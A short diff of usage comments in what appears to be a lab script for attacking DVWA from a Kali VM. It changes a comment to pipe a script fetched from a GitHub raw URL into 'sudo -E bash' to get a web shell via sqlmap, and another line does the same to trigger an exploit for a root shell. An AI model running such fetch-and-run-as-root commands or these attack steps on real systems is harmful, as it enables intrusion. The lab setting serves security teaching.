@@ -16,7 +16,7 @@
 # --- For Kali VM (The Attacker) ---
 #
 # Get the initial www-data shell via sqlmap (prerequisite):
-#   DVWA_PHPSESSID=<ID> DVWA_TARGET_URL="http://<IP>" sudo -E bash -s kali_get_shell
+#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="http://<IP>" sudo -E bash -s kali_get_shell
 #
 # Display instructions on how to trigger the exploit and catch the root shell:
 #   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/refs/heads/master/usyd/scripts-library/dvwa-peas.sh | sudo bash -s trigger_exploit
